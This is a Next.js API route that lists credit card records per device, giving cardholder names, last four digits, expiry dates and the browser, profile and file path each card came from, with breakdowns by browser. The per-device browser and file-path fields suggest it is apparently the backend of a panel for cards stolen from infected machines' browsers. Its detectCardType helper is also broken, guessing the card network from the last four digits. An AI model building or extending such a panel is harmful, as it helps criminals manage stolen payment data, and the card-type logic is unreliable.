import { NextRequest, NextResponse } from "next/server"
import { executeQuery } from "@/lib/mysql"
import { validateRequest } from "@/lib/auth"

/**
 * GET /api/v1/devices/[deviceId]/credit-cards
 * Get credit card data for a device
 * Query params:
 *   - limit: Results limit (default 50)
 *   - offset: Pagination offset (default 0)
 *   - browser: Filter by browser
 */
export async function GET(
  request: NextRequest,
  { params }: { params: { deviceId: string } }
) {
  // Validate authentication
  const user = await validateRequest(request)
  if (!user) {
    return NextResponse.json({ success: false, error: "Unauthorized" }, { status: 401 })
  }

  try {
    const { deviceId } = params
    const { searchParams } = new URL(request.url)

    const limit = Number.parseInt(searchParams.get("limit") || "50")
    const offset = Number.parseInt(searchParams.get("offset") || "0")
    const browser = searchParams.get("browser") || ""

    let query = `
      SELECT
        id,
        device_id,
        card_number_encrypted,
        card_number_last4,
        cardholder_name,
        expiration_month,
        expiration_year,
        browser,
        profile,
        file_path,
        created_at
      FROM credit_cards
      WHERE device_id = ?
    `

    const queryParams: any[] = [deviceId]

    // Browser filter
    if (browser) {
      query += ` AND browser = ?`
      queryParams.push(browser)
    }

    // Get total count
    const countQuery = query.replace(/SELECT[\s\S]*?FROM/, "SELECT COUNT(*) as total FROM")
    const countResult = (await executeQuery(countQuery, queryParams)) as any[]
    const total = countResult[0]?.total || 0

    // Add ordering and pagination
    query += ` ORDER BY created_at DESC LIMIT ? OFFSET ?`
    queryParams.push(limit, offset)

    const creditCards = (await executeQuery(query, queryParams)) as any[]

    // Get browser breakdown
    const browserBreakdown = await executeQuery(
      `
      SELECT
        browser,
        COUNT(*) as count
      FROM credit_cards
      WHERE device_id = ?
      GROUP BY browser
      ORDER BY count DESC
    `,
      [deviceId]
    )

    return NextResponse.json({
      success: true,
      total,
      limit,
      offset,
      credit_cards: creditCards.map((card) => {
        const expirationDate = card.expiration_month && card.expiration_year
          ? new Date(card.expiration_year, card.expiration_month - 1)
          : null

        const isExpired = expirationDate ? expirationDate < new Date() : null
        const expiresWithinMonths = expirationDate
          ? Math.floor((expirationDate.getTime() - Date.now()) / (1000 * 60 * 60 * 24 * 30))
          : null

        return {
          id: card.id,
          device_id: card.device_id,
          card_number_last4: card.card_number_last4,
          cardholder_name: card.cardholder_name,
          expiration_month: card.expiration_month,
          expiration_year: card.expiration_year,
          expiration_display: card.expiration_month && card.expiration_year
            ? `${String(card.expiration_month).padStart(2, '0')}/${card.expiration_year}`
            : "Unknown",
          is_expired: isExpired,
          expires_within_months: expiresWithinMonths,
          card_type: detectCardType(card.card_number_last4),
          browser: card.browser || "Unknown",
          profile: card.profile,
          file_path: card.file_path,
          created_at: card.created_at
        }
      }),
      summary: {
        total_cards: total,
        expired_cards: creditCards.filter((c) => {
          if (!c.expiration_month || !c.expiration_year) return false
          const expDate = new Date(c.expiration_year, c.expiration_month - 1)
          return expDate < new Date()
        }).length,
        browsers: browserBreakdown
      }
    })
  } catch (error) {
    console.error("Error fetching credit cards:", error)
    return NextResponse.json(
      {
        success: false,
        error: error instanceof Error ? error.message : "Failed to fetch credit cards"
      },
      { status: 500 }
    )
  }
}

/**
 * Detect card type from last 4 digits (basic heuristic)
 * Note: This is not accurate without full card number
 */
function detectCardType(last4: string): string {
  if (!last4) return "Unknown"

  // This is a very rough guess - would need full BIN for accuracy
  // Common patterns based on issuer number ranges
  const firstDigit = last4[0]

  switch (firstDigit) {
    case "4":
      return "Visa"
    case "5":
      return "Mastercard"
    case "3":
      return "American Express"
    case "6":
      return "Discover"
    default:
      return "Unknown"
  }
}
